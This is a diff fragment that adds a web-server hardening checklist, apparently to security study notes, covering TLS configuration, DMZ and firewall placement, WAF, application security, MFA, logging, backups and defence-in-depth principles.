+    - **TLS 1.2/1.3 only**, with a certificate from a trusted CA.
+    - Disable SSLv3, TLS 1.0 and 1.1, and weak ciphers.
+    - Redirect all HTTP to HTTPS, and enable **HSTS**.
+
+    (d) Network protection
+    - Place the server in a **DMZ**, never on the internal LAN.
+    - **Firewall** allowing only ports 80 and 443 inbound.
+    - **WAF** in front of the application.
+    - **DDoS protection** and rate limiting.
+    - Restrict administrative access to a management VLAN or through a VPN and bastion host.
+
+    (e) Application security
+    - Secure coding practices, input validation, parameterised queries, output encoding.
+    - Regular **VAPT** and dependency scanning for vulnerable libraries.
+    - Remove test files, backup files and source control directories (`.git`) from the web root.
+
+    (f) Access control
+    - Least privilege, role-based access, **MFA for administrative logins**, and disabling of unused accounts.
+
+    (g) Monitoring, logging and backup
+    - Centralised logging to a SIEM, **File Integrity Monitoring** on web content, IDS/IPS, and alerting.
+    - **Regular backups** stored off-server, with tested restores.
+    - Documented incident response plan.
+
+    (h) Physical and operational
+    - Secure data centre access, redundant power and cooling, and change management for every configuration change.
+
+    - Underlying principle: **defence in depth plus default deny** — remove everything not needed, permit only what is required, and monitor everything that remains.
 
 ## Authentication & Access Control (16)
 
